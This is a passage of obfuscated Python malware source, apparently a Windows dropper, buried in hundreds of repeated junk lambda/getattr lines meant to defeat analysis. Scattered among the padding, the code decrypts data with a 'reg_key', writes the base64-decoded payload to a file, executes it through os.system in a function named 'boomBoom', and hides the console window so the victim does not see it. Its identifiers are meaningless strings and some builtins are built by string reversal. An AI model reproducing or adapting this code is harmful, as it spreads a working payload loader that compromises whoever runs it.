             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        vwehweureure, cqwcqsqgqwywe = zbznpibipewnipbnweipnipegwtywe(boqwoubfobupwepuobg, reg_key)
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        nippinnipgnipqwiptipqipwtipqwt(boqwoubfobupwepuobg)
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        with open(location, 'wb') as hseheshes:
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            hseheshes.write(b64decode(vwehweureure))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
        return True
    except WindowsError:
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        return False
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
def boomBoom(location):
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    return os.system(location)
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
def erherhzzveeaw(string):
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    return getattr(string, 'lower')()
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))

(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
def magic(a):
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    windll.user32.ShowWindow(windll.kernel32.GetConsoleWindow(), a)
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))

(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
def jersrsejrse():
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    return lambda wegeawg: getattr(globals()['__builtins__'], ''.join(['y' + 'n' + 'a'])[::-1])(wegeawg)
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
